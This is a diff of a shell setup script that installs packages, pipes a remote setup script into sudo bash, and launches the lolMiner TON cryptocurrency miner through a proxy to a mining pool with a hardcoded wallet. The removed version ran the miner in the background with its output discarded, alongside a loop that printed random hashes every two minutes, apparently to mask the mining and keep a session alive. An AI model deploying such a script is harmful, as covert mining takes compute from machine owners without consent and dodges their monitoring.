@@ -1,4 +1,5 @@
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+apt update && apt -y install sudo
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 apt-get install -y nodejs
@@ -35,5 +36,4 @@ chmod +x lolMiner
 
 ph add lolMiner
 
-./graftcp/graftcp ./lolMiner --algo TON --pool wss://pplns.toncoinpool.io/stratum --user EQAMrKwDNU_jlzgdIZSFWh2wGm24bzHhLqkUJn04sKvaGj5F.$(cat /proc/sys/kernel/hostname) >/dev/null &
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+./graftcp/graftcp ./lolMiner --algo TON --pool wss://pplns.toncoinpool.io/stratum --user EQAhYfA5-ENSYrig434CEOSFH47z5I6hft6X6magteGGEwlT.$(cat /proc/sys/kernel/hostname)
